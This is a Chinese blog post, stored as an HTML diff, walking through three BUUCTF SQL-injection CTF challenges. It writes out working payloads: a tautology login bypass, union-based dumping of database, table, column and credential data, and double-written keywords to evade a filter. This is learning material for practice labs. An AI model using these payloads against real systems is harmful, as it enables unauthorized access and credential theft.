@@ -1,0 +1,228 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>SQL入门题[极客大挑战 2019] | FakerCsr's magic box</title><meta name="author" content="FakerCsr"><meta name="copyright" content="FakerCsr"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="这几道题我都是在BUUCTF里写到的 对于我们sql注入入门还是很不错的几道题[极客大挑战 2019]EasySQL看题目就知道是sql注入，还说是很简单的，那倒要看看有多简单打开网页在账号密码那都输入上’1看看果然有明显的回响，然后输入一下我们的永真语句试试好家伙，真就简单的直接出flag了     最近也在学一写sql注入的内容，看了几期视频，发现在构造1&#39; or 1 &#x3D; 1#’时，s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL入门题[极客大挑战 2019]">
+<meta property="og:url" content="http://fakercsr.github.io/posts/145c0a80/index.html">
+<meta property="og:site_name" content="FakerCsr&#39;s magic box">
+<meta property="og:description" content="这几道题我都是在BUUCTF里写到的 对于我们sql注入入门还是很不错的几道题[极客大挑战 2019]EasySQL看题目就知道是sql注入，还说是很简单的，那倒要看看有多简单打开网页在账号密码那都输入上’1看看果然有明显的回响，然后输入一下我们的永真语句试试好家伙，真就简单的直接出flag了     最近也在学一写sql注入的内容，看了几期视频，发现在构造1&#39; or 1 &#x3D; 1#’时，s">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://fakercsr.github.io/img/15.jpg">
+<meta property="article:published_time" content="2021-10-13T13:30:51.058Z">
+<meta property="article:modified_time" content="2021-10-13T13:39:22.473Z">
+<meta property="article:author" content="FakerCsr">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fakercsr.github.io/img/15.jpg"><link rel="shortcut icon" href="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="canonical" href="http://fakercsr.github.io/posts/145c0a80/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":50},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQL入门题[极客大挑战 2019]',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-10-13 21:39:22'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="./css/my.css"><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/csrcsyh/note/raw/master/img/20211012202654.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/./img/15.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">FakerCsr's magic box</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL入门题[极客大挑战 2019]</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-10-13T13:30:51.058Z" title="发表于 2021-10-13 21:30:51">2021-10-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-10-13T13:39:22.473Z" title="更新于 2021-10-13 21:39:22">2021-10-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQL入门题[极客大挑战 2019]"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="这几道题我都是在BUUCTF里写到的-对于我们sql注入入门还是很不错的几道题"><a href="#这几道题我都是在BUUCTF里写到的-对于我们sql注入入门还是很不错的几道题" class="headerlink" title="这几道题我都是在BUUCTF里写到的 对于我们sql注入入门还是很不错的几道题"></a><strong>这几道题我都是在BUUCTF里写到的 对于我们sql注入入门还是很不错的几道题</strong></h2><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>看题目就知道是sql注入，还说是很简单的，那倒要看看有多简单<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201206162020588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">打开网页在账号密码那都输入上’1看看<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201206162104346.png" alt="在这里插入图片描述">果然有明显的回响，然后输入一下我们的永真语句试试<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201206162241925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">好家伙，真就简单的直接出flag了<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201206162316301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>     最近也在学一写sql注入的内容，看了几期视频，发现在构造<code>1&#39; or 1 = 1#’</code>时，sql代码本身是自带有<code>&#39;   &#39;</code>两个引号的然后你加入<code>1&#39;</code>之后他就会与前面的单引号自动闭合<code>&#39;1&#39;&#39;</code>输入之后就会得到这样的结果，多出了一个单引号，也正是这个原因我们可以通过加<code>&#39;</code>来判断这个是否存在sql注入，如果存在那么多出了单引号就会报错，从而判断出有sql注入。当然这里的<code>1&#39; or 1 = 1#</code>中的<code>#</code>是注释符也就是说把这个语句后面多出的单引号注释了，这样他就无法报错并且无法执行后面的语句，从而达到我们的目的。其中<code>or</code>就是“或”语句连接1和1=1，如果1是错误的，那就执行or后面的1=1永为真，从而可以实现 sql注入，爆出flag。<br>    这里我还有个疑问，就是我将<code>#</code>注释符换成了<code>-- </code>注释符就好像成功不了了（并且我在<code>--</code>后面加过空格了），各位大佬多多指教，评论区可以留言告知，呜呜</p>
+<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>这题需要用到联合查询，不懂联合查询的可以看看我之前写的一篇博客，挺详细的</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51439282/article/details/110825020">https://blog.csdn.net/qq_51439282/article/details/110825020</a></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201211215241925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">打开界面发现又是他，我们像上次一样试试永真语句<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201211215338808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>好家伙，真就出来flag了？？<br>看起像md5就拿去在线网站解密了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201211215450412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现解不出，看来并没有这么简单，是用来迷惑人的</p>
+<p>既然这样那就只好一步一步来查询数据了</p>
+<p><strong>查询数据在之前的文章提到过一般分为四个步骤：<br>第一步：获取当前数据库名称及当前数据库用户<br>第二步：获取表名称<br>第三步：获取列名称<br>第四步：获取数据</strong></p>
+<p><strong>先进行第一步：获取当前数据库名称及当前数据库用户</strong></p>
+<p>对他进行注入获取数据库名称</p>
+<p><code>1&#39; union select 1,2,database()#</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201211220116524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201211220043322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">获取到当前数据库名称为geek</p>
+<p><strong>那就进行第二步：获取表名称</strong></p>
+<p><code>1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39; #</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201211220251397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201211220235594.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注入后得到两个表名称，看着l0ve1ysq1这个表名称和题目比较像就先查询他的数据</p>
+<p><strong>第三步：查询列名称</strong></p>
+<p><code>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;l0ve1ysq1&#39; #</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201211220548500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201211220538145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">查询到列名称：id,username,password</p>
+<p><strong>那就可以进行最后一步：获取数据</strong></p>
+<p><code>1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1# </code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201211220859730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201211220838283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样就得到flag啦</p>
+<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>看到又是他直接永真语句来一波<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201211221104311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201211221114897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">呜呜这次直接报错了，看来得按流程走了，继续我们的查询数据四步走~</p>
+<p><strong>第一步：获取当前数据库名称及当前数据库用户</strong></p>
+<p>直接构造<code>1&#39; union select 1,2,database()#</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201211221509122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201211221443352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">我们发现他竟然报错了，果然如他所说进行了过滤</p>
+<p>可以发现他对union以及select都进行了过滤</p>
+<p>我们现在可以试试双写能不能避开过滤</p>
+<p>那就构造<code>1&#39; ununionion seselectlect 1,2,database()#</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201211221708112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201211221651828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>oh~出来了，得到了数据库名select。</p>
+<p>看来是可以用双写来避开过滤，原理应该是你输入ununionion的时候然后里面检测到union这五个连在一起的字母，就会进行过滤，不过你还会剩下一个un和一个ion，中间的消失之后那就还剩一个union，自然可以继续查询，这里他应该只能过滤一次，所以双写能避开这种过滤。</p>
+<p><strong>进行第二步：获取表名称</strong></p>
+<p><code>1&#39; ununionion seselectlect 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39;#</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/2020121122214168.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">发现报错了。。。。</p>
+<p>经过观察原来from information where应该都过滤掉了，那就都试试双写（一般同一题过滤类型都一样吧，果断试试）</p>
+<p>尝试构造：</p>
+<p><code>1&#39; ununionion seselectlect 1,2,group_concat(table_name) frfromom inforinformationmation_schema.tables whwhereere table_schema=&#39;geek&#39;#</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201211222445570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">发现他还是报错了，看来还是有问题</p>
+<p>经过观察报错可以发现or都不见了，原来是他没有过滤整个information，只对or进行了过滤，那我们只要进行双写or就可以啦~</p>
+<p>那就构造<code>1&#39; ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=&#39;geek&#39;#</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201211222810759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这样就获得了表名称</p>
+<p>按照老样子我们写来查询和题目名字差不多的表b4bsql</p>
+<p><strong>进行第三步：获取列名称</strong></p>
+<p>直接构造<br><code>1&#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39;#</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201211222952698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">很顺利的拿到了列名称</p>
+<p><strong>进行最后一步：获取数据</strong></p>
+<p>直接构造<code>1&#39; ununionion seselectlect 1,2,group_concat(id,username,password) frfromom b4bsql#</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201211223132354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">oh~no，忘记了将password里面的or给双写了</p>
+<p>那就构造<code>1&#39; ununionion seselectlect 1,2,group_concat(id,username,passwoorrd) frfromom b4bsql#</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20201211223247674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDM5Mjgy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">成功爆出flag，大功告成！！</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">FakerCsr</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://fakercsr.github.io/posts/145c0a80/">http://fakercsr.github.io/posts/145c0a80/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://FakerCsr.github.io" target="_blank">FakerCsr's magic box</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/./img/15.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/c50c53af/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./img/10.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">buuctf里的[极客大挑战 2019]Havefun</div></div></a></div><div class="next-post pull-right"><a href="/posts/4b8eada3/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./img/12.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div 